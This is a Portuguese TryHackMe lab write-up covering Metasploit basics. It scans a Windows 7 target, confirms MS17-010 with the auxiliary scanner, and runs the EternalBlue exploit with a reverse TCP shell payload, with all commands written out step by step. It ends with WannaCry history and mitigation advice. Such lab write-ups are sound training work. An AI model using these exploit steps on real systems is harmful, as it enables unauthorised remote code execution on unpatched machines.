# TryHackMe — Metasploit: The Basics

**Trilha:** Jr Penetration Tester → Metasploit and Exploitation
**Room:** Metasploit: The Basics
**Foco:** Navegação no msfconsole, busca de módulos, configuração de exploits e exploração da vulnerabilidade EternalBlue (MS17-010) em um alvo Windows 7.

---

## 📋 Sumário

- [Objetivo](#objetivo)
- [Ambiente](#ambiente)
- [1. Reconhecimento](#1-reconhecimento)
- [2. Buscando e inspecionando o módulo](#2-buscando-e-inspecionando-o-módulo)
- [3. Entendendo os parâmetros do exploit](#3-entendendo-os-parâmetros-do-exploit)
- [4. `set` vs `setg`](#4-set-vs-setg)
- [5. Confirmando a vulnerabilidade com o módulo auxiliar](#5-confirmando-a-vulnerabilidade-com-o-módulo-auxiliar)
- [6. Selecionando o payload e explorando](#6-selecionando-o-payload-e-explorando)
- [7. Pós-exploração](#7-pós-exploração)
- [8. Sobre a vulnerabilidade (EternalBlue / MS17-010)](#8-sobre-a-vulnerabilidade-eternalblue--ms17-010)
- [9. Mitigação e lições aprendidas](#9-mitigação-e-lições-aprendidas)
- [Referências](#referências)

---

## Objetivo

Praticar o fluxo completo de uso do Metasploit Framework — da pesquisa e inspeção de um módulo até a obtenção de uma sessão no sistema alvo — explorando uma vulnerabilidade real e historicamente relevante: o **EternalBlue**, usado no ataque global do ransomware WannaCry em 2017.

## Ambiente

| Item | Detalhe |
|---|---|
| Atacante | Kali Linux (fornecido pelo TryHackMe) |
| Alvo | Windows 7 vulnerável ao MS17-010 |
| Ferramenta principal | Metasploit Framework (`msfconsole`) |
| IP do atacante (LHOST) | `10.66.109.207` |
| IP do alvo (RHOSTS) | `10.66.131.185` |
| Rede | VPN TryHackMe |

---

## 1. Reconhecimento

Antes de entrar no `msfconsole`, validei que o alvo estava respondendo na porta SMB (445).

Primeira tentativa, sem sucesso:

```bash
nmap -sV -p445 10.66.131.185
```
→ `Host seems down` (o Nmap manda um probe de ping antes do scan, e a VM não respondeu).

Ajustada com `-Pn` (pula o ping e vai direto ao scan de porta):

```bash
nmap -sV -Pn -p445 10.66.131.185
```
→ `Host is up`, porta 445 aparece como `filtered microsoft-ds`. O estado `filtered` costuma indicar um firewall no meio do caminho, mas não impede a exploração via SMB diretamente — a confirmação real viria do módulo auxiliar do Metasploit mais adiante.

---

## 2. Buscando e inspecionando o módulo

Antes de usar o exploit, consultei as informações do módulo para entender o que ele faz, quais opções aceita e os requisitos:

```
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

O `info` traz a descrição da vulnerabilidade, os sistemas-alvo suportados, referências (CVE, boletins) e a lista de opções — é um bom primeiro passo antes de carregar qualquer módulo.

Para efetivamente selecioná-lo e poder configurá-lo:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

E, para ver as opções configuráveis:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

---

## 3. Entendendo os parâmetros do exploit

O `show options` lista os parâmetros que o módulo espera. No contexto do MS17-010/EternalBlue, os principais são:

| Parâmetro | Significado |
|---|---|
| **RHOSTS** (Remote Host) | IP da máquina alvo — o computador vulnerável que será atacado/explorado. |
| **RPORT** (Remote Port) | Porta no alvo usada pelo exploit. Para o EternalBlue é a porta **445** (SMB), já configurada por padrão. |
| **LHOST** (Local Host) | IP (ou interface, ex: `eth0`) da sua própria máquina (Kali) — é para onde o Windows comprometido vai "ligar de volta" depois que o exploit funcionar, permitindo receber a sessão Meterpreter/shell. |
| **LPORT** (Local Port) | Porta na sua máquina que ficará escutando essa conexão de volta. Normalmente já vem um valor padrão (ex: `4444`). |

---

## 4. `set` vs `setg`

Um detalhe importante do fluxo: parâmetros configurados com `set` são **locais ao módulo atual**. Se eu troco de módulo (com `use` ou `back` seguido de outro `use`), esses valores somem e preciso configurá-los de novo.

Já o `setg` define um valor **global**, que persiste entre todos os módulos durante a mesma sessão do `msfconsole`. Isso é útil quando se está trabalhando contra o mesmo alvo com vários módulos diferentes — exatamente o caso aqui, já que alterno entre o exploit principal e o módulo auxiliar de detecção.

Configuração usada:

```
setg RHOSTS 10.66.131.185
set LPORT 4444
```

Com o `RHOSTS` como global, ele permanece setado mesmo trocando de módulo — o que evita ter que repetir esse valor toda vez.

---

## 5. Confirmando a vulnerabilidade com o módulo auxiliar

Antes de disparar o exploit, voltei ao prompt principal do `msfconsole` para rodar um módulo auxiliar de detecção, que varre o alvo em busca da falha sem executar o payload:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
```

Como o `RHOSTS` havia sido definido com `setg`, ele já apareceu preenchido automaticamente no `show options` desse módulo — sem precisar configurar de novo.

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

> 💡 Na primeira tentativa recebi um `Rex::ConnectionTimeout`, provavelmente por instabilidade momentânea na VM/VPN do lab. Após confirmar que a máquina estava com status "Running" e a conexão estável, rodei novamente e obtive a confirmação de que o host estava vulnerável ao MS17-010.

---

## 6. Selecionando o payload e explorando

Com a vulnerabilidade confirmada, voltei ao exploit principal:

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > back
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Listei os payloads compatíveis com o exploit:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

E selecionei um payload do tipo *shell* reverso:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
```

Por fim, disparei o exploit:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

Durante a execução, o módulo passa pelas etapas características do EternalBlue — detecção do SO alvo, envio dos pacotes SMB fragmentados que exploram a corrupção de memória no kernel, e injeção do payload. Ao final, se tudo correr bem, uma **sessão de shell** é aberta na máquina alvo.

---

## 7. Pós-exploração

Com a sessão aberta, o próximo passo natural é a fase de **pós-exploração** — coletar informações do sistema, escalar privilégios (se necessário) e manter/gerenciar o acesso. Essa etapa é abordada em detalhe na room seguinte da trilha, dedicada especificamente a pós-exploração no Metasploit.

---

## 8. Sobre a vulnerabilidade (EternalBlue / MS17-010)

- **O que é:** falha no protocolo **SMBv1** do Windows que permite execução remota de código (RCE) sem autenticação e sem interação do usuário.
- **Origem:** desenvolvida originalmente pela NSA como ferramenta ofensiva, vazada publicamente pelo grupo **Shadow Brokers** em abril de 2017.
- **Patch:** a Microsoft já havia lançado a correção (boletim **MS17-010**) um mês antes do vazamento público.
- **Impacto real:** usada no ransomware **WannaCry** (maio de 2017), que se espalhou como um worm e infectou centenas de milhares de computadores em mais de 150 países, afetando fortemente o NHS (sistema de saúde do Reino Unido), com hospitais cancelando cirurgias e desviando pacientes.

---

## 9. Mitigação e lições aprendidas

- Manter sistemas **sempre atualizados** — o patch para o EternalBlue existia semanas antes do ataque em massa.
- Desabilitar o **SMBv1** quando não for estritamente necessário (está desabilitado por padrão desde o Windows 10/Server 2016).
- Segmentar a rede para limitar a propagação lateral em caso de comprometimento.
- Monitorar tráfego SMB incomum e manter EDR/antivírus atualizados.
- Do ponto de vista operacional no Metasploit: usar `setg` para parâmetros compartilhados entre módulos (como `RHOSTS` contra o mesmo alvo) economiza tempo e reduz erro de configuração ao alternar entre módulos de varredura e exploração.

---

## Referências

- TryHackMe — Metasploit: The Basics (trilha Jr Penetration Tester)
- Microsoft Security Bulletin MS17-010
- Relatórios públicos sobre o ataque WannaCry (2017)

---

> 📝 **Nota:** write-up produzido para fins educacionais, como parte da trilha de estudos em Penetration Testing. Nenhuma informação sensível ou real de produção foi utilizada — ambiente isolado fornecido pelo TryHackMe.
